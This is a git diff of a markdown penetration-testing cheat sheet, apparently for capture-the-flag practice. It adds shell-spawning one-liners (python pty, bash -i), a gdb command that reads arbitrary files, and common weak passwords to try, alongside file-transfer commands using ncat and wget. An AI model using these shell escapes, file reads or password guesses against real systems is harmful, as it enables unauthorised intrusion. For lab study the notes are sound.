@@ -1,4 +1,4 @@
-# HackNotes 【第一】
+# HackNotes 【第一】🐱‍💻
 
 ## Introduction to Cyber Security
 
@@ -26,6 +26,24 @@ Sender: `ncat [IP] [PORT] --send-only < file.ext`
 `python-m http.server [PORT]`
 ##### On the Target Machine
 `wget [IP/URL]:[PORT] -O filename.ext`
+
+### Spawning 🐚
+##### python
+`python -c 'import pty; pty.spawn("/bin/sh")'`
+##### echo
+`echo 'os.system('/bin/bash')'`
+##### bash
+`/bin/bash -i`
+##### sh
+`/bin/sh -i`
+
+### Useful Trickeries
+##### gdb file read 
+`gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit`
+
+### Bad Passwords worth to try
+- qazwsxedc
+- p4ssw0rd
 
 ## Learn From Walkthroughs
 - https://www.hackingarticles.in/seppuku1-vulnhub-walkthrough/ (brute forcing basic authentication)
